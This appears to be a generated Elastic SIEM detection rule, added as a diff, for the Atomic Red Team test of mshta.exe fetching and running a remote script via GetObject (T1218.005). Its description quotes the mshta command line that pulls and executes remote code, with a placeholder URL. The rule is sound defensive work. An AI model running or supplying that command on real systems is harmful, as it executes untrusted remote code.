@@ -1,0 +1,39 @@
+[rule]
+author = [ "AtomicRedTeam-Automation",]
+description = "Detection for specific test 'Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject' (GUID: 1483fab9-4f52-4217-a9ce-daa9d7747cae) of technique T1218.005 (Signed Binary Proxy Execution: Mshta). Test Description: Test execution of a remote script using mshta.exe. Upon execution calc.exe will be launched.. Command/Steps: mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();\n"
+from = "now-9m"
+rule_id = "be55bd05-b6f3-4d4d-a54b-caf815e55086"
+language = "kql"
+name = "Atomic Test: T1218.005 - Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject"
+output_index = ".siem-signals-default"
+references = [ "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/refs/heads/master/atomics/T1218.005/T1218.005.yaml",]
+risk_score = 50
+severity = "medium"
+tags = [ "AtomicRedTeam", "T1218.005", "1483fab9-4f52-4217-a9ce-daa9d7747cae", "windows",]
+type = "query"
+query = "(process.name : (\\\"cmd.exe\\\", \\\"cmmon32.exe\\\") OR process.parent.name : (\\\"cmd.exe\\\", \\\"cmmon32.exe\\\")) AND process.command_line : \\\"*mshta.exe*\\\""
+version = 1
+index = [ "logs-endpoint.events.*", "winlogbeat-*", "logs-windows.*", "logs-linux.*", "logs-macos.*",]
+[[rule.threat]]
+framework = "MITRE ATT&CK"
+[[rule.threat.technique]]
+id = "T1218.005"
+name = "Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject"
+reference = "https://attack.mitre.org/techniques/T1218/005"
+
+[[rule.threat.tactic]]
+id = "TA0003"
+name = "Persistence"
+reference = "https://attack.mitre.org/techniques/T1218/005"
+
+[[rule.threat.tactic]]
+id = "TA0004"
+name = "Privilege Escalation"
+reference = "https://attack.mitre.org/techniques/T1218/005"
+
+[[rule.threat.tactic]]
+id = "TA0005"
+name = "Defense Evasion"
+reference = "https://attack.mitre.org/techniques/T1218/005"
+
+
